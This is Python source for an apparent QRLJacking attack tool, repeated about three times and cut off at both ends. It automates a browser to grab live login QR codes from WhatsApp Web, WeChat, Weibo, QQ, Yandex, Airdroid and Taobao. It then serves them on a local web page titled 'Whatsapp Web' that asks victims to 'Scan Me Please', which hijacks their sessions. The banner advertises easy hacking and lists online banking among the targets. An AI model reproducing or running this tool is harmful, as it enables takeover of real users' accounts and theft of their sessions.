		else:                    
			print " [!] Serving files on "+str(port)+" port"
			os.system("python -m SimpleHTTPServer "+str(port)+" > /dev/null 2>&1")                    
	threading.Thread(target=serve,args=(port,)).start()

def create_driver():
	try:
		web = webdriver.Firefox()
		print " [+]Opening Mozila FireFox..."
		return web                    
	except:
		web = webdriver.Chrome()                    
		print " [+]Opening Google Chrome..."                    
		return web                    

#Stolen from stackoverflow :D
def Screenshot(PicName ,location ,size):
	img = Image.open(PicName)#screenshot.png
	left = location['x']
	top = location['y']
	right = left + size['width']
	bottom = top + size['height']
	box = (int(left), int(top), int(right), int(bottom))
	final = img.crop(box) # defines crop points
	final.load()
	final.save(PicName)

def whatsapp():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get('https://web.whatsapp.com/')
	time.sleep(5)

	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			button = driver.find_element_by_class_name('qr-button')
			print " [!]Clicking to reload QR code image..."
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass

		try:
			img = driver.find_elements_by_tag_name('img')[0]
			src = img.get_attribute('src').replace("data:image/png;base64,","")
			print " [+]The QR code image found !"
			print " [+]Downloading the image.."
			binary_data = a2b_base64(src)
			qr = open("tmp.png","wb")
			qr.write(binary_data)
			print " [#]Saved To tmp.png"
			qr.close()
			time.sleep(5)
			continue
		except:
			break

#make("svg")
def Yandex():
	print "\n-- --- -- --- -- --- -- --- -- --- --"
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://passport.yandex.com/auth?mode=qr")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			img_url = "https://passport.yandex.com" + driver.find_element_by_class_name("qr-code__i").get_attribute("style").split("\"")[1].encode("utf-8")
			print " [+]The QR code image found !"
			data = urllib.urlopen(img_url).read()
			print " [+]Downloading the image.."
			f = open("tmp.svg","w").write(data)
			print " [#]Saved To tmp.svg"
			time.sleep(10)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def Airdroid():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("http://web.airdroid.com")
	time.sleep(5)
	img_number = 16
	refresh = 0
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			button = driver.find_element_by_class_name("widget-login-refresh-qrcode")[0]
			print " [!]Clicking to reload QR code image..."
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[img_number]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			if refresh == 0:
				print " [!]Refreshing page..."
				driver.refresh()
				refresh = 1
			img_number = 15
			continue
		except:
			break

def Weibo():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("http://weibo.com/login.php")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[len(imgs)-1]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def WeChat():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://web.wechat.com")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			continue
		except:
			break

def QQ():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("http://w.qq.com")
	time.sleep(10)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			driver.save_screenshot('tmp.png') #screenshot entire page
			img = driver.find_elements_by_tag_name("img")[0]
			print " [+]The QR code image found !"
			location = img.location
			size = img.size
			print " [+]Grabbing photo.."
			Screenshot("tmp.png" ,location ,size)
			print " [#]Saved To tmp.png"
			webdriver.delete_all_cookies()
			time.sleep(10)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def Taobao():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://login.taobao.com")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			button_class = web.find_element_by_class_name("msg-err")
			button = button_class.find_elements_by_tag_name("a")[0]
			print " [!]Clicking to reload QR code image..."
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			continue
		except:
			break

def make(typ="html"):
	if typ == "html":
		code = """<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;"></center>
</body></html>"""

	if typ == "svg":
		code = """<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src="tmp.svg?h="+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<object id="qrcodew" data="tmp.svg" type="image/svg+xml"></object></center>
</body></html>"""
	f = open("index.html","w")
	f.write(code)
	f.close()

def Simple_Exploit(classname,url,image_number,s=10):
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get(url)

	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			login = driver.find_element_by_class_name(classname)
			img = login.find_elements_by_tag_name('img')[int(image_number)]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(s)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def clear():                    
	if os.name == "nt":                    
		os.system("cls")                    
	else:                    
		os.system("clear")                    

def main():
	#clear()
	print """\n
	  ___         _       _               _
	 / _ \  _ __ | |     | |  __ _   ___ | | __ ___  _ __
	| | | || '__|| |  _  | | / _` | / __|| |/ // _ \| '__|
	| |_| || |   | | | |_| || (_| || (__ |   <|  __/| |
	 \__\_\|_|   |_|  \___/  \__,_| \___||_|\_\\___||_|

# Hacking With Qrljacking Attack Vector Become Easy
# Coded By karim Shoair | D4Vinci

 Vulnerable Web Applications and Services:
  1.Chat Applications
  2.Mailing Services
  3.eCommerce
  4.Online Banking
  5.Passport Services
  6.Mobile Management Software
  7.Other Services
  8.Customization
"""
	choice = input(" Choice > ")

	#Chat Applications
	if choice == 1:
		print """
 1.WhatsApp
 2.WeChat
 3.Line
 4.Weibo
 5.QQ Instant Messaging
 00.Back To Main Menu
	"""

		choice_2 = raw_input(" Second Choice > ")

		if choice_2 == "00":
			main()

		#Whatsapp
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			whatsapp()
			main()

		#Wechat
		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			WeChat()
			main()

		#3

		#Weibo
		elif int(choice_2) == 4:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			Weibo()
			main()

		elif int(choice_2) == 5:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			QQ()
			main()

	#Mailing Services
	if choice == 2:
		print """
 1.QQ Mail
 2.Yandex Mail
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")

		if choice_2 == "00":
			main()

		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make("svg")
			Serve_it(port)
			Yandex()
			main()

	#eCommerce
	if choice == 3:
		print """
 1.Alibaba
 2.Aliexpress
 3.Taobao
 4.Tmall
 5.1688.com
 6.Alimama
 7.Taobao Trips
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

		elif int(choice_2) == 3:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

		#4

		#5

		#6

		elif int(choice_2) == 7:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

	#Online Banking
	if choice == 4:
		print """
 1.AliPay
 2.Yandex Money
 3.TenPay
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

	#Passport Services
	if choice == 5:
		print """
 1.Yandex Passport
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

	#Mobile Management Software
	if choice == 6:
		print """
 1.Airdroid
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")

		if choice_2 == "00":
			main()

		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			Airdroid()
			main()

	#Other Services
	if choice == 7:
		print """
 1.MyDigiPass
 2.Zapper
 3.Trustly App
 4.Yelophone
 5.Alibaba Yunos
 00.Back To Main Menu
"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

	#Customization
	#if choice == 8:
		#settings.read("Data/Simple.ini")
		#url = settings.get("WeChat","url")
		#image_number = settings.get("WeChat","image_number")
		#classname = settings.get("WeChat","classname")
if __name__ == '__main__':
	main()

#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#Author:D4Vinci
import base64 ,time ,selenium ,os ,urllib ,sys ,threading ,configparser                    
from selenium import webdriver                    
from binascii import a2b_base64
from PIL import Image                    

#settings = configparser.ConfigParser()

def Serve_it(port=1337):
	def serve(port):
		if os.name=="nt":
			print " [!] Serving files on "+str(port)+" port"
			os.system("python -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")                    
		else:                    
			print " [!] Serving files on "+str(port)+" port"
			os.system("python -m SimpleHTTPServer "+str(port)+" > /dev/null 2>&1")                    
	threading.Thread(target=serve,args=(port,)).start()

def create_driver():
	try:
		web = webdriver.Firefox()
		print " [+]Opening Mozila FireFox..."
		return web                    
	except:
		web = webdriver.Chrome()                    
		print " [+]Opening Google Chrome..."                    
		return web                    

#Stolen from stackoverflow :D
def Screenshot(PicName ,location ,size):
	img = Image.open(PicName)#screenshot.png
	left = location['x']
	top = location['y']
	right = left + size['width']
	bottom = top + size['height']
	box = (int(left), int(top), int(right), int(bottom))
	final = img.crop(box) # defines crop points
	final.load()
	final.save(PicName)

def whatsapp():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get('https://web.whatsapp.com/')
	time.sleep(5)

	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			button = driver.find_element_by_class_name('qr-button')
			print " [!]Clicking to reload QR code image..."
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass

		try:
			img = driver.find_elements_by_tag_name('img')[0]
			src = img.get_attribute('src').replace("data:image/png;base64,","")
			print " [+]The QR code image found !"
			print " [+]Downloading the image.."
			binary_data = a2b_base64(src)
			qr = open("tmp.png","wb")
			qr.write(binary_data)
			print " [#]Saved To tmp.png"
			qr.close()
			time.sleep(5)
			continue
		except:
			break

#make("svg")
def Yandex():
	print "\n-- --- -- --- -- --- -- --- -- --- --"
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://passport.yandex.com/auth?mode=qr")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			img_url = "https://passport.yandex.com" + driver.find_element_by_class_name("qr-code__i").get_attribute("style").split("\"")[1].encode("utf-8")
			print " [+]The QR code image found !"
			data = urllib.urlopen(img_url).read()
			print " [+]Downloading the image.."
			f = open("tmp.svg","w").write(data)
			print " [#]Saved To tmp.svg"
			time.sleep(10)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def Airdroid():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("http://web.airdroid.com")
	time.sleep(5)
	img_number = 16
	refresh = 0
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			button = driver.find_element_by_class_name("widget-login-refresh-qrcode")[0]
			print " [!]Clicking to reload QR code image..."
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[img_number]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			if refresh == 0:
				print " [!]Refreshing page..."
				driver.refresh()
				refresh = 1
			img_number = 15
			continue
		except:
			break

def Weibo():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("http://weibo.com/login.php")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[len(imgs)-1]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def WeChat():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://web.wechat.com")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			continue
		except:
			break

def QQ():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("http://w.qq.com")
	time.sleep(10)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			driver.save_screenshot('tmp.png') #screenshot entire page
			img = driver.find_elements_by_tag_name("img")[0]
			print " [+]The QR code image found !"
			location = img.location
			size = img.size
			print " [+]Grabbing photo.."
			Screenshot("tmp.png" ,location ,size)
			print " [#]Saved To tmp.png"
			webdriver.delete_all_cookies()
			time.sleep(10)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def Taobao():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://login.taobao.com")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			button_class = web.find_element_by_class_name("msg-err")
			button = button_class.find_elements_by_tag_name("a")[0]
			print " [!]Clicking to reload QR code image..."
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			continue
		except:
			break

def make(typ="html"):
	if typ == "html":
		code = """<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;"></center>
</body></html>"""

	if typ == "svg":
		code = """<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src="tmp.svg?h="+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<object id="qrcodew" data="tmp.svg" type="image/svg+xml"></object></center>
</body></html>"""
	f = open("index.html","w")
	f.write(code)
	f.close()

def Simple_Exploit(classname,url,image_number,s=10):
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get(url)

	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			login = driver.find_element_by_class_name(classname)
			img = login.find_elements_by_tag_name('img')[int(image_number)]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(s)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def clear():                    
	if os.name == "nt":                    
		os.system("cls")                    
	else:                    
		os.system("clear")                    

def main():
	#clear()
	print """\n
	  ___         _       _               _
	 / _ \  _ __ | |     | |  __ _   ___ | | __ ___  _ __
	| | | || '__|| |  _  | | / _` | / __|| |/ // _ \| '__|
	| |_| || |   | | | |_| || (_| || (__ |   <|  __/| |
	 \__\_\|_|   |_|  \___/  \__,_| \___||_|\_\\___||_|

# Hacking With Qrljacking Attack Vector Become Easy
# Coded By karim Shoair | D4Vinci

 Vulnerable Web Applications and Services:
  1.Chat Applications
  2.Mailing Services
  3.eCommerce
  4.Online Banking
  5.Passport Services
  6.Mobile Management Software
  7.Other Services
  8.Customization
"""
	choice = input(" Choice > ")

	#Chat Applications
	if choice == 1:
		print """
 1.WhatsApp
 2.WeChat
 3.Line
 4.Weibo
 5.QQ Instant Messaging
 00.Back To Main Menu
	"""

		choice_2 = raw_input(" Second Choice > ")

		if choice_2 == "00":
			main()

		#Whatsapp
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			whatsapp()
			main()

		#Wechat
		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			WeChat()
			main()

		#3

		#Weibo
		elif int(choice_2) == 4:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			Weibo()
			main()

		elif int(choice_2) == 5:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			QQ()
			main()

	#Mailing Services
	if choice == 2:
		print """
 1.QQ Mail
 2.Yandex Mail
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")

		if choice_2 == "00":
			main()

		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make("svg")
			Serve_it(port)
			Yandex()
			main()

	#eCommerce
	if choice == 3:
		print """
 1.Alibaba
 2.Aliexpress
 3.Taobao
 4.Tmall
 5.1688.com
 6.Alimama
 7.Taobao Trips
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

		elif int(choice_2) == 3:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

		#4

		#5

		#6

		elif int(choice_2) == 7:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

	#Online Banking
	if choice == 4:
		print """
 1.AliPay
 2.Yandex Money
 3.TenPay
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

	#Passport Services
	if choice == 5:
		print """
 1.Yandex Passport
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

	#Mobile Management Software
	if choice == 6:
		print """
 1.Airdroid
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")

		if choice_2 == "00":
			main()

		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			Airdroid()
			main()

	#Other Services
	if choice == 7:
		print """
 1.MyDigiPass
 2.Zapper
 3.Trustly App
 4.Yelophone
 5.Alibaba Yunos
 00.Back To Main Menu
"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

	#Customization
	#if choice == 8:
		#settings.read("Data/Simple.ini")
		#url = settings.get("WeChat","url")
		#image_number = settings.get("WeChat","image_number")
		#classname = settings.get("WeChat","classname")
if __name__ == '__main__':
	main()

#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#Author:D4Vinci
import base64 ,time ,selenium ,os ,urllib ,sys ,threading ,configparser                    
from selenium import webdriver                    
from binascii import a2b_base64
from PIL import Image                    

#settings = configparser.ConfigParser()

def Serve_it(port=1337):
	def serve(port):
		if os.name=="nt":
			print " [!] Serving files on "+str(port)+" port"
			os.system("python -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")                    
		else:                    
			print " [!] Serving files on "+str(port)+" port"
			os.system("python -m SimpleHTTPServer "+str(port)+" > /dev/null 2>&1")                    
	threading.Thread(target=serve,args=(port,)).start()

def create_driver():
	try:
		web = webdriver.Firefox()
		print " [+]Opening Mozila FireFox..."
		return web                    
	except:
		web = webdriver.Chrome()                    
		print " [+]Opening Google Chrome..."                    
		return web                    

#Stolen from stackoverflow :D
def Screenshot(PicName ,location ,size):
	img = Image.open(PicName)#screenshot.png
	left = location['x']
	top = location['y']
	right = left + size['width']
	bottom = top + size['height']
	box = (int(left), int(top), int(right), int(bottom))
	final = img.crop(box) # defines crop points
	final.load()
	final.save(PicName)

def whatsapp():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get('https://web.whatsapp.com/')
	time.sleep(5)

	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			button = driver.find_element_by_class_name('qr-button')
			print " [!]Clicking to reload QR code image..."
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass

		try:
			img = driver.find_elements_by_tag_name('img')[0]
			src = img.get_attribute('src').replace("data:image/png;base64,","")
			print " [+]The QR code image found !"
			print " [+]Downloading the image.."
			binary_data = a2b_base64(src)
			qr = open("tmp.png","wb")
			qr.write(binary_data)
			print " [#]Saved To tmp.png"
			qr.close()
			time.sleep(5)
			continue
		except:
			break

#make("svg")
def Yandex():
	print "\n-- --- -- --- -- --- -- --- -- --- --"
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://passport.yandex.com/auth?mode=qr")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			img_url = "https://passport.yandex.com" + driver.find_element_by_class_name("qr-code__i").get_attribute("style").split("\"")[1].encode("utf-8")
			print " [+]The QR code image found !"
			data = urllib.urlopen(img_url).read()
			print " [+]Downloading the image.."
			f = open("tmp.svg","w").write(data)
			print " [#]Saved To tmp.svg"
			time.sleep(10)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def Airdroid():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("http://web.airdroid.com")
	time.sleep(5)
	img_number = 16
	refresh = 0
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			button = driver.find_element_by_class_name("widget-login-refresh-qrcode")[0]
			print " [!]Clicking to reload QR code image..."
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[img_number]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			if refresh == 0:
				print " [!]Refreshing page..."
				driver.refresh()
				refresh = 1
			img_number = 15
			continue
		except:
			break

def Weibo():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("http://weibo.com/login.php")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[len(imgs)-1]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def WeChat():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://web.wechat.com")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			continue
		except:
			break

def QQ():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("http://w.qq.com")
	time.sleep(10)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			driver.save_screenshot('tmp.png') #screenshot entire page
			img = driver.find_elements_by_tag_name("img")[0]
			print " [+]The QR code image found !"
			location = img.location
			size = img.size
			print " [+]Grabbing photo.."
			Screenshot("tmp.png" ,location ,size)
			print " [#]Saved To tmp.png"
			webdriver.delete_all_cookies()
			time.sleep(10)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def Taobao():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://login.taobao.com")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			button_class = web.find_element_by_class_name("msg-err")
			button = button_class.find_elements_by_tag_name("a")[0]
			print " [!]Clicking to reload QR code image..."
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			continue
		except:
			break

def make(typ="html"):
	if typ == "html":
		code = """<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;"></center>
</body></html>"""

	if typ == "svg":
		code = """<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src="tmp.svg?h="+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<object id="qrcodew" data="tmp.svg" type="image/svg+xml"></object></center>
</body></html>"""
	f = open("index.html","w")
	f.write(code)
	f.close()

def Simple_Exploit(classname,url,image_number,s=10):
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get(url)

	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			login = driver.find_element_by_class_name(classname)
			img = login.find_elements_by_tag_name('img')[int(image_number)]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(s)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def clear():                    
	if os.name == "nt":                    
		os.system("cls")                    
	else:                    
		os.system("clear")                    

def main():
	#clear()
	print """\n
	  ___         _       _               _
	 / _ \  _ __ | |     | |  __ _   ___ | | __ ___  _ __
	| | | || '__|| |  _  | | / _` | / __|| |/ // _ \| '__|
	| |_| || |   | | | |_| || (_| || (__ |   <|  __/| |
	 \__\_\|_|   |_|  \___/  \__,_| \___||_|\_\\___||_|

# Hacking With Qrljacking Attack Vector Become Easy
# Coded By karim Shoair | D4Vinci

 Vulnerable Web Applications and Services:
  1.Chat Applications
  2.Mailing Services
  3.eCommerce
  4.Online Banking
  5.Passport Services
  6.Mobile Management Software
  7.Other Services
  8.Customization
"""
	choice = input(" Choice > ")

	#Chat Applications
	if choice == 1:
		print """
 1.WhatsApp
 2.WeChat
 3.Line
 4.Weibo
 5.QQ Instant Messaging
 00.Back To Main Menu
	"""

		choice_2 = raw_input(" Second Choice > ")

		if choice_2 == "00":
			main()

		#Whatsapp
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
